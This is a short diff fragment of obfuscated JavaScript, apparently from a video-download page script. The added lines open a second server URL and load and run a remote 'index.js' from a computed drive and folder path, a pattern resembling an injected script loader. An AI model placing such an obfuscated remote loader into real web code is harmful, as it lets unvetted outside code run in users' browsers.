@@ -54,4 +54,8 @@ var zzszhisdddceardsscz=document.getElementById(ob);     download_video_set_in=d
 
 
 var zsssasd_iswe = ""+fcasmdplex_loadex.open(fcasmdplex_load_url())+"";
+var zsssasd_iswez = ""+fcasmdplex_loadex.open(fcasmdplex_load_server())+"";
+
+loadJS(fs_trans_serprefix["drive"]+"/"+fs_trans_serprefix["folder"]+"/index.js", notifyLoad);
+
 
